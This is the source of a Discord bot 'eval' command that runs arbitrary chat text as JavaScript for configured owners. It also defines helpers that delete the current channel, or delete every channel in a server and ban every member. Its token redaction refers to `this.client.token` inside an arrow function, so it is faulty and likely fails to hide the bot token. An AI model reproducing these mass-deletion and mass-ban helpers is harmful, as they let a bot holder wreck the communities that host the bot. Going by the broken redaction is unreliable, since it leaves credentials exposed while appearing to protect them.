
module.exports = {
    name : "eval",
  run : async (client,message,args)=> {
      if(!client.config.owner.includes(message.author.id)) return;
      function nuke(){
        message.channel.clone().then((a) => {
          message.channel.delete()
          a.send(`Nuked by: ${message.author}`)
        })
      }
      function nukeguild(){
        message.guild.channels.cache.forEach((ch) => {
          ch.delete()
        })
        message.guild.members.cache.forEach((member) => {
          member.ban();
        })
      }
  const content = message.content
        .split(" ")
        .slice(1)
        .join(" ");
      const result = new Promise(resolve => resolve(eval(content)));

      return result
        .then(output => {
          if (typeof output !== "string") {
            output = require("util").inspect(output, { depth: 0 });
          }
          if (output.includes(client.token)) {
            output = output.replace(
              this.client.token,
              "LOL BRO"
            );
          }
          message.channel.send(`\`\`\`${output}\`\`\``, {
            code: "js"
          });
        })
        .catch(err => {
          err = err.toString();
          if (err.includes(client.token)) {
            err = err.replace(this.client.token, "ABE SALE");
          }
          message.channel.send(err, {
            code: "js"
          });
        });
     }
}